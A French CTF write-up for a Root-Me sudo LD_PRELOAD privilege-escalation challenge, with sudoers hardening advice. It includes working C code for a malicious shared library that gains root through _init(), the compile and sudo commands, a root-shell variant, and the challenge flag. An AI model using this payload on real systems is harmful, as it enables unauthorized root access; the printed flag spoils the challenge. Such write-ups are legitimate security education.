# Linux Privesc - LD_PRELOAD (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32026
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32026
```

---

## Objectif

Un administrateur système a configuré sudo avec une faille de sécurité. Exploiter cette mauvaise configuration pour obtenir un accès root et lire `/root/flag.txt`.

---

## Reconnaissance

### Vérification des permissions sudo

```bash
user@challenge:~$ sudo -l
Matching Defaults entries for user on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD

User user may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/ls
```

### Analyse de la vulnérabilité

```
env_keep+=LD_PRELOAD
│        │  └── Variable d'environnement préservée
│        └── Ajoute à la liste des variables conservées
└── Option Defaults de sudo

VULNÉRABILITÉ!
LD_PRELOAD est conservé lors de l'exécution sudo
```

| Élément | Valeur | Risque |
|---------|--------|--------|
| `env_keep+=LD_PRELOAD` | Préserve LD_PRELOAD | **CRITIQUE** |
| Commande autorisée | `/usr/bin/ls` | Peu importe (juste besoin d'exécuter) |
| NOPASSWD | Oui | Exploitation sans mot de passe |

---

## Concept : LD_PRELOAD

### Qu'est-ce que LD_PRELOAD ?

`LD_PRELOAD` est une variable d'environnement qui permet de charger une bibliothèque partagée (.so) AVANT toutes les autres lors de l'exécution d'un programme.

```
Programme exécuté
       │
       ▼
┌──────────────────┐
│ Chargeur (ld.so) │
│                  │
│ 1. LD_PRELOAD    │ ← Notre bibliothèque malveillante
│ 2. Libs système  │
│ 3. Programme     │
└──────────────────┘
```

### Fonctions spéciales

| Fonction | Description |
|----------|-------------|
| `_init()` | Exécutée automatiquement au chargement de la lib |
| `_fini()` | Exécutée à la fin |
| Fonctions hijackées | Remplacent les fonctions standard (printf, read...) |

---

## Exploitation

### Étape 1 : Créer la bibliothèque malveillante

```bash
user@challenge:~$ cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Évite la récursion
    setuid(0);                // Devient root
    setgid(0);                // Groupe root
    system("cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out");
}
EOF
```

### Explication du code

```c
void _init() {
    // _init() est appelée automatiquement par ld.so au chargement

    unsetenv("LD_PRELOAD");
    // Supprime LD_PRELOAD pour éviter que les sous-processus
    // (system()) ne rechargent notre lib en boucle

    setuid(0);
    setgid(0);
    // Change l'UID/GID effectif à root (0)
    // Fonctionne car le processus est déjà EUID root via sudo

    system("cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out");
    // Exécute notre commande avec les droits root
}
```

### Étape 2 : Compiler en bibliothèque partagée

```bash
user@challenge:~$ gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
```

| Option | Description |
|--------|-------------|
| `-fPIC` | Position Independent Code (requis pour .so) |
| `-shared` | Crée une bibliothèque partagée |
| `-nostartfiles` | N'inclut pas les fichiers de démarrage standard |
| `-o /tmp/shell.so` | Fichier de sortie |

### Étape 3 : Exploiter avec sudo

```bash
user@challenge:~$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ls
```

### Étape 4 : Lire le flag

```bash
user@challenge:~$ cat /tmp/flag.out
RM{6a3872948e6ad154ed0ced173bf1405b}
```

---

## Alternative : Shell interactif

```bash
# Code pour obtenir un shell root
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");  // Shell avec privilèges
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ls

# On obtient un shell root
root@challenge:~# cat /root/flag.txt
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION SUDO                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Defaults env_keep+=LD_PRELOAD  ← VULNÉRABILITÉ!           │
│                                                             │
│  user ALL=(root) NOPASSWD: /usr/bin/ls                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    CRÉATION PAYLOAD                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /tmp/shell.c → gcc → /tmp/shell.so                         │
│                                                             │
│  void _init() {        ← S'exécute au chargement            │
│      setuid(0);        ← Devient root                       │
│      system("...");    ← Notre commande                     │
│  }                                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOITATION                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ls                  │
│       │                        │                            │
│       │                        └── Commande autorisée       │
│       │                                                     │
│       └── Variable préservée par env_keep                   │
│                                                             │
│  Séquence d'exécution:                                      │
│  1. sudo lance /usr/bin/ls en tant que root                 │
│  2. ld.so charge shell.so AVANT ls                          │
│  3. _init() s'exécute avec EUID=0                           │
│  4. Notre code s'exécute en ROOT!                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    FLAG CAPTURÉ                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  RM{6a3872948e6ad154ed0ced173bf1405b}                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{6a3872948e6ad154ed0ced173bf1405b}
```

---

## Autres variables dangereuses

| Variable | Description | Risque |
|----------|-------------|--------|
| `LD_PRELOAD` | Charge une lib avant les autres | Exécution de code |
| `LD_LIBRARY_PATH` | Chemin de recherche des libs | Hijacking de lib |
| `PYTHONPATH` | Chemin des modules Python | Module hijacking |
| `PERL5LIB` | Chemin des modules Perl | Module hijacking |
| `RUBYLIB` | Chemin des modules Ruby | Module hijacking |
| `CLASSPATH` | Chemin des classes Java | Class hijacking |

### Vérifier les variables préservées

```bash
sudo -l | grep env_keep
```

---

## Comment se protéger

### 1. Ne jamais préserver LD_PRELOAD

```bash
# MAUVAIS
Defaults env_keep+=LD_PRELOAD

# BON (par défaut, sudo reset l'environnement)
Defaults env_reset
```

### 2. Configuration sudoers sécurisée

```bash
# /etc/sudoers
Defaults    env_reset
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults    !env_keep

# Liste blanche minimale si nécessaire
Defaults    env_keep="DISPLAY EDITOR"
```

### 3. Auditer la configuration

```bash
# Vérifier les variables préservées
sudo grep -r "env_keep" /etc/sudoers /etc/sudoers.d/

# Tester avec -V
sudo -V | grep "Environment variables"
```

---

## Pourquoi ça fonctionne

### Protection habituelle de sudo

Par défaut, sudo **supprime** LD_PRELOAD de l'environnement :

```
Sans env_keep+=LD_PRELOAD:
  user$ sudo LD_PRELOAD=/tmp/evil.so /bin/ls
  # LD_PRELOAD est ignoré (sécurité)
```

### Avec env_keep+=LD_PRELOAD

```
Avec env_keep+=LD_PRELOAD:
  user$ sudo LD_PRELOAD=/tmp/evil.so /bin/ls
  # LD_PRELOAD est CONSERVÉ
  # evil.so est chargé AVANT /bin/ls
  # _init() s'exécute en tant que ROOT
```

---

## Commandes utiles

```bash
# Vérifier si LD_PRELOAD est préservé
sudo -l | grep LD_PRELOAD

# Voir toutes les variables préservées
sudo -V 2>/dev/null | grep env

# Compiler une lib partagée
gcc -fPIC -shared -nostartfiles -o lib.so code.c

# Tester LD_PRELOAD (sans sudo)
LD_PRELOAD=./lib.so /bin/ls

# Lister les libs chargées par un programme
ldd /bin/ls

# Tracer les appels de chargement
LD_DEBUG=libs /bin/ls 2>&1 | head
```

---

## Ressources

- [HackTricks - LD_PRELOAD](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload)
- [GTFOBins - sudo](https://gtfobins.github.io/gtfobins/sudo/)
- `man ld.so` - Documentation du chargeur dynamique
- `man sudoers` - Configuration de sudo
- `man 8 sudo` - Options de sudo
